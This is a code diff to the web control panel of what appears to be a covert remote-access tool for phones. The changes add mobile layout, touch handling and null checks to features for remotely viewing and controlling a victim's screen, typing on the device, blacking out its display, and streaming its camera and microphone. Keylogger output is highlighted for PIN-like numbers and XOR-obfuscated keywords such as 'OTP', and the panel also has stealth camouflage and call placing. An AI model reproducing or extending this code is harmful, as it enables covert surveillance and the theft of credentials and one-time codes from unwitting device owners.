@@ -76,6 +76,40 @@ if (window.location.pathname.startsWith('/proxy')) {
   }
 }
 
+// Dynamically Inject Responsive Mobile Layout Styles for Ghost Viewport
+function injectMobileStyles() {
+  if (document.getElementById("ghost-responsive-style")) return;
+  const style = document.createElement("style");
+  style.id = "ghost-responsive-style";
+  style.textContent = `
+    .ghost-screen-wrapper, .ghost-viewport-container {
+      width: 100% !important;
+      max-width: 360px !important;
+      margin: 0 auto !important;
+      display: flex !important;
+      flex-direction: column !important;
+      align-items: center !important;
+      justify-content: center !important;
+      box-sizing: border-box !important;
+      padding: 8px !important;
+      overflow: hidden !important;
+    }
+    #ghost-screen-stream {
+      width: 100% !important;
+      max-width: 100% !important;
+      height: auto !important;
+      max-height: 70vh !important;
+      object-fit: contain !important;
+      display: block !important;
+      margin: 0 auto !important;
+      border-radius: 14px !important;
+      box-shadow: 0 0 20px rgba(0, 242, 255, 0.25) !important;
+      touch-action: none !important;
+    }
+  `;
+  document.head.appendChild(style);
+}
+
 // UI Info Popup
 function showInfo(e, t, o) {
   if (e) e.stopPropagation();
@@ -325,7 +359,7 @@ function _0x4a(e, t, o) {
       transition: "opacity 0.4s ease",
       backdropFilter: "blur(10px)"
     });
-    n.innerHTML = '<div style="background:#0a0a0f; border:1px solid var(--neon-cyan); padding:40px; border-radius:15px; width:450px; text-align:center; box-shadow:0 0 50px rgba(0,242,255,0.2);"><div style="font-family:Orbitron, sans-serif; color:var(--neon-cyan); font-size:1.2rem; margin-bottom:15px;" id="tm-title">TACTICAL_INITIATION</div><div style="color:#aaa; font-size:0.85rem; margin-bottom:30px; min-height:40px;" id="tm-msg">Preparing remote system command...</div><div style="width:100%; height:4px; background:rgba(255,255,255,0.05); border-radius:2px; overflow:hidden; margin-bottom:30px;"><div id="tm-progress" style="width:0%; height:100%; background:var(--neon-cyan); box-shadow:0 0 10px var(--neon-cyan); transition: width 0.3s ease;"></div></div><div style="display:flex; justify-content:center; gap:20px;"><button id="tm-cancel" class="btn btn-small" style="border-color:#555; color:#555;">ABORT_SEQUENCE</button></div></div>';
+    n.innerHTML = '<div style="background:#0a0a0f; border:1px solid var(--neon-cyan); padding:40px; border-radius:15px; width:450px; max-width:90vw; text-align:center; box-shadow:0 0 50px rgba(0,242,255,0.2);"><div style="font-family:Orbitron, sans-serif; color:var(--neon-cyan); font-size:1.2rem; margin-bottom:15px;" id="tm-title">TACTICAL_INITIATION</div><div style="color:#aaa; font-size:0.85rem; margin-bottom:30px; min-height:40px;" id="tm-msg">Preparing remote system command...</div><div style="width:100%; height:4px; background:rgba(255,255,255,0.05); border-radius:2px; overflow:hidden; margin-bottom:30px;"><div id="tm-progress" style="width:0%; height:100%; background:var(--neon-cyan); box-shadow:0 0 10px var(--neon-cyan); transition: width 0.3s ease;"></div></div><div style="display:flex; justify-content:center; gap:20px;"><button id="tm-cancel" class="btn btn-small" style="border-color:#555; color:#555;">ABORT_SEQUENCE</button></div></div>';
     document.body.appendChild(n);
   }
 
@@ -653,9 +687,31 @@ function executeShell() {
   }
 }
 
-// Ghost Screen Controls
+// Ghost Screen Controls with Auto Responsive Sizing
+function enforceGhostViewportScaling() {
+  const streamImg = document.getElementById("ghost-screen-stream");
+  if (streamImg) {
+    streamImg.style.width = "100%";
+    streamImg.style.maxWidth = "360px";
+    streamImg.style.height = "auto";
+    streamImg.style.maxHeight = "70vh";
+    streamImg.style.objectFit = "contain";
+    streamImg.style.display = "block";
+    streamImg.style.margin = "0 auto";
+    streamImg.style.borderRadius = "12px";
+    
+    const parent = streamImg.parentElement;
+    if (parent) {
+      parent.style.maxWidth = "100%";
+      parent.style.boxSizing = "border-box";
+      parent.style.overflow = "hidden";
+    }
+  }
+}
+
 function startGhostScreen() {
   _0x2a = true;
+  enforceGhostViewportScaling();
   const statusCard = document.getElementById("ghost-screen-status");
   if (statusCard) statusCard.style.display = "none";
   const btn = document.getElementById("ghost-toggle-btn");
@@ -680,7 +736,8 @@ function stopGhostScreen() {
     btn.style.borderColor = "var(--neon-green)";
     btn.style.color = "var(--neon-green)";
   }
-  document.getElementById("ghost-screen-stream").src = "";
+  const streamImg = document.getElementById("ghost-screen-stream");
+  if (streamImg) streamImg.src = "";
 }
 
 function toggleGhostScreen() {
@@ -695,10 +752,11 @@ function refreshGhostScreen() {
   if (_0x2a) {
     const streamImg = document.getElementById("ghost-screen-stream");
     const statusCard = document.getElementById("ghost-screen-status");
+    enforceGhostViewportScaling();
     const img = new Image();
     img.src = "/ghost/screenshot?t=" + Date.now();
     img.onload = () => {
-      if (_0x2a) {
+      if (_0x2a && streamImg) {
         streamImg.src = img.src;
         if (statusCard) statusCard.style.display = "none";
         setTimeout(refreshGhostScreen, _0x2b ? 5000 : 200);
@@ -711,10 +769,14 @@ function refreshGhostScreen() {
 }
 
 function startGhostDrag(e) {
-  const rect = document.getElementById("ghost-screen-stream").getBoundingClientRect();
+  const streamImg = document.getElementById("ghost-screen-stream");
+  if (!streamImg) return;
+  const rect = streamImg.getBoundingClientRect();
+  const clientX = e.touches ? e.touches[0].clientX : e.clientX;
+  const clientY = e.touches ? e.touches[0].clientY : e.clientY;
   _0x2c = {
-    x: (e.clientX - rect.left) / rect.width * 100,
-    y: (e.clientY - rect.top) / rect.height * 100,
+    x: (clientX - rect.left) / rect.width * 100,
+    y: (clientY - rect.top) / rect.height * 100,
     t: Date.now()
   };
 }
@@ -724,15 +786,19 @@ function endGhostDrag(e) {
   const now = Date.now();
   if (now - _0x2d < 150) return;
   _0x2d = now;
-  const rect = document.getElementById("ghost-screen-stream").getBoundingClientRect();
-  const currentX = (e.clientX - rect.left) / rect.width * 100;
-  const currentY = (e.clientY - rect.top) / rect.height * 100;
+  const streamImg = document.getElementById("ghost-screen-stream");
+  if (!streamImg) return;
+  const rect = streamImg.getBoundingClientRect();
+  const clientX = e.changedTouches ? e.changedTouches[0].clientX : e.clientX;
+  const clientY = e.changedTouches ? e.changedTouches[0].clientY : e.clientY;
+  const currentX = (clientX - rect.left) / rect.width * 100;
+  const currentY = (clientY - rect.top) / rect.height * 100;
   const dragDuration = now - _0x2c.t;
 
   if (Math.sqrt(Math.pow(currentX - _0x2c.x, 2) + Math.pow(currentY - _0x2c.y, 2)) < 2) {
-    fetch("/ghost/interact?action=click&px=" + _0x2c.x + "&py=" + _0x2c.y);
+    fetch("/ghost/interact?action=click&px=" + _0x2c.x.toFixed(2) + "&py=" + _0x2c.y.toFixed(2));
   } else {
-    fetch("/ghost/interact?action=swipe&px1=" + _0x2c.x + "&py1=" + _0x2c.y + "&px2=" + currentX + "&py2=" + currentY + "&d=" + Math.max(dragDuration, 100));
+    fetch("/ghost/interact?action=swipe&px1=" + _0x2c.x.toFixed(2) + "&py1=" + _0x2c.y.toFixed(2) + "&px2=" + currentX.toFixed(2) + "&py2=" + currentY.toFixed(2) + "&d=" + Math.max(dragDuration, 100));
   }
   _0x2c = null;
 }
@@ -764,7 +830,8 @@ function toggleLock() {
 }
 
 function toggleBlackout() {
-  const isActivating = document.getElementById("blackout-btn").innerText.includes("ACTIVATE");
+  const blackoutBtn = document.getElementById("blackout-btn");
+  const isActivating = blackoutBtn && blackoutBtn.innerText.includes("ACTIVATE");
   showToast(isActivating ? "BLACKOUT_PROTOCOL_ENGAGED" : "RESTORING_HARDWARE_BACKLIGHT...");
   fetch("/ghost/interact?action=" + (isActivating ? "blackout_on" : "blackout_off")).then(() => checkGhostStatus());
 }
@@ -774,22 +841,25 @@ function toggleAutoPilot() {
     .then(res => res.json())
     .then(data => {
       const btn = document.getElementById("autopilot-btn");
-      if (data.autopilot) {
-        btn.innerText = "AUTOPILOT_ENGAGED";
-        btn.classList.add("btn-engaged-yellow");
-        btn.style.color = "#000";
-        btn.style.background = "#ffff00";
-      } else {
-        btn.innerText = "AUTOPILOT_OFF";
-        btn.classList.remove("btn-engaged-yellow");
-        btn.style.color = "var(--neon-yellow)";
-        btn.style.background = "rgba(255, 255, 255, 0.03)";
+      if (btn) {
+        if (data.autopilot) {
+          btn.innerText = "AUTOPILOT_ENGAGED";
+          btn.classList.add("btn-engaged-yellow");
+          btn.style.color = "#000";
+          btn.style.background = "#ffff00";
+        } else {
+          btn.innerText = "AUTOPILOT_OFF";
+          btn.classList.remove("btn-engaged-yellow");
+          btn.style.color = "var(--neon-yellow)";
+          btn.style.background = "rgba(255, 255, 255, 0.03)";
+        }
       }
     });
 }
 
 function ghostType() {
   const e = document.getElementById("ghost-type-input");
+  if (!e) return;
   const t = e.value;
   if (t) fetch("/ghost/interact?action=type&text=" + encodeURIComponent(t));
   e.value = "";
@@ -906,7 +976,7 @@ function _0x5a(n, r, a, l, s) {
     event.stopPropagation();
     const targetX = 100 * (n.x + n.w / 2) / l;
     const targetY = 100 * (n.y + n.h / 2) / s;
-    fetch(`/ghost/interact?action=click&px=${targetX}&py=${targetY}`);
+    fetch(`/ghost/interact?action=click&px=${targetX.toFixed(2)}&py=${targetY.toFixed(2)}`);
   };
 
   r.appendChild(e);
@@ -922,7 +992,7 @@ async function refreshGhostLogs() {
     if (res.ok) {
       const data = await res.json();
       const n = document.getElementById("ghost-terminal");
-      if (n && data.keys.length > 0) {
+      if (n && data.keys && data.keys.length > 0) {
         const autoScroll = n.scrollHeight - n.scrollTop <= n.clientHeight + 10;
         let formattedText = data.keys.join("").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
         formattedText = formattedText.replace(/(\[.*?\] ->)/g, '<span style="color:var(--neon-cyan); font-weight:bold; opacity:0.8;">$1</span>');
@@ -933,9 +1003,9 @@ async function refreshGhostLogs() {
           formattedText = formattedText.replace(re, '<span style="color:var(--neon-yellow); font-weight:bold; border-bottom:1px solid var(--neon-yellow);">$1</span>');
         });
 
-        formattedText = formattedText.replace(/\b(\d{4,8})\b/g, '<span style="color:var(--danger); font-weight:bold; text-shadow: 0 0 8px var(--danger);">$1</span>');
+        formattedText = formattedText.replace(/ (\d{4,8}) /g, '<span style="color:var(--danger); font-weight:bold; text-shadow: 0 0 8px var(--danger);">$1</span>');
 
-        ["\\x1C\\x0D\\x03", "\\x13\\x18\\x00\\x12\\x13\\x01\\x10\\x0A", "\\x0F\\x06\\x14\\x00\\x0A", "\\x16\\x1A\\x16\\x13", "\\x06\\x04\\x02\\x08\\x08"].forEach(pattern => {
+        ["\x1C\x0D\x03", "\x13\x18\x00\x12\x13\x01\x10\x0A", "\x0F\x06\x14\x00\x0A", "\x16\x1A\x16\x13", "\x06\x04\x02\x08\x08"].forEach(pattern => {
           const dec = pattern.split("").map((ch, idx) => String.fromCharCode(ch.charCodeAt(0) ^ "SysAdmin".charCodeAt(idx % 8))).join("");
           const re = new RegExp("(" + dec + ")", "gi");
           formattedText = formattedText.replace(re, '<span style="color:var(--danger); font-weight:bold; text-shadow: 0 0 10px rgba(255,49,49,0.5);">$1</span>');
@@ -1079,17 +1149,6 @@ async function initiateStream(camId) {
     window.cameraStreamActive = true;
     _0x3a = true;
 
-    const liveIndicator = document.getElementById("live-indicator");
-    const dot = document.getElementById("indicator-dot");
-    const text = document.getElementById("indicator-text");
-    if (liveIndicator) {
-      liveIndicator.style.borderColor = "var(--neon-green)";
-      liveIndicator.style.color = "var(--neon-green)";
-      liveIndicator.style.background = "rgba(57, 255, 20, 0.15)";
-    }
-    if (dot) dot.className = "badge-dot blink-slow";
-    if (text) text.innerText = "LIVE";
-
     fetch("/camera/start-stream?cam=" + camId + "&width=" + _0x3d + "&height=" + _0x3e + "&quality=" + _0x3f).catch(() => {});
 
     function refreshCameraFeed() {
@@ -1101,7 +1160,7 @@ async function initiateStream(camId) {
             mainStream.src = offscreenImg.src;
             mainStream.style.display = "block";
             if (loading) loading.style.display = "none";
-            setTimeout(refreshCameraFeed, 20); // Silky smooth 20ms frame loop
+            setTimeout(refreshCameraFeed, 20);
           }
         };
         offscreenImg.onerror = () => {
@@ -1300,9 +1359,12 @@ function openExternalMap() {
 
 // File Filters
 function filterFiles() {
-  const searchVal = document.getElementById("file-search").value.toLowerCase();
+  const searchEl = document.getElementById("file-search");
+  if (!searchEl) return;
+  const searchVal = searchEl.value.toLowerCase();
   document.querySelectorAll(".file-item").forEach(item => {
-    if (item.querySelector(".file-name").textContent.toLowerCase().includes(searchVal)) {
+    const nameEl = item.querySelector(".file-name");
+    if (nameEl && nameEl.textContent.toLowerCase().includes(searchVal)) {
       item.style.display = "flex";
     } else {
       item.style.display = "none";
@@ -1316,9 +1378,12 @@ function setFilter(ext) {
   } else {
     const list = ext.split(",");
     document.querySelectorAll(".file-item").forEach(item => {
-      const name = item.querySelector(".file-name").textContent.toUpperCase();
-      const match = list.some(suffix => name.endsWith(suffix));
-      item.style.display = match ? "flex" : "none";
+      const nameEl = item.querySelector(".file-name");
+      if (nameEl) {
+        const name = nameEl.textContent.toUpperCase();
+        const match = list.some(suffix => name.endsWith(suffix));
+        item.style.display = match ? "flex" : "none";
+      }
     });
   }
 }
@@ -1329,7 +1394,9 @@ function clearIntel() {
 }
 
 function toggleStealth() {
-  const val = document.getElementById("stealth-type").value;
+  const stealthEl = document.getElementById("stealth-type");
+  if (!stealthEl) return;
+  const val = stealthEl.value;
   showToast("INITIATING_STEALTH_CAMOUFLAGE...");
   fetch("/stealth?type=" + val)
     .then(res => res.json())
@@ -1355,7 +1422,9 @@ async function toggleLiveAudio() {
       try { _ih.stream.getTracks().forEach(t => t.stop()); } catch (e) {}
       _ih = null;
     }
-    audioStream.getTracks().forEach(t => t.stop());
+    if (audioStream.getTracks) {
+      audioStream.getTracks().forEach(t => t.stop());
+    }
     if (player) {
       player.pause();
       player.removeAttribute('src');
@@ -1436,7 +1505,7 @@ async function startStealthUplink() {
   }
 }
 
-// Consolidated Call Logic with Safe Input Handling (Null Checks)
+// Consolidated Call Logic with Safe Input Handling
 async function initiateCellularCall(num) {
   if (!num) {
     const dialInput = document.getElementById("dial-number");
@@ -1512,7 +1581,10 @@ document.addEventListener("visibilitychange", () => {
 });
 
 document.addEventListener("DOMContentLoaded", () => {
+  injectMobileStyles();
   updateNav();
+  enforceGhostViewportScaling();
+
   let camScroll = localStorage.getItem("cam_scroll");
   if (camScroll) {
     window.scrollTo(0, parseInt(camScroll));
@@ -1524,7 +1596,7 @@ document.addEventListener("DOMContentLoaded", () => {
     setInterval(fetchLogs, 5000);
   }
 
-  if (document.getElementById("ghost-status-card")) {
+  if (document.getElementById("ghost-status-card") || document.getElementById("ghost-screen-stream")) {
     checkGhostStatus();
     refreshGhostLogs();
     setInterval(checkGhostStatus, 2000);
@@ -1596,3 +1668,4 @@ document.addEventListener("DOMContentLoaded", () => {
     }
   });
 });
+
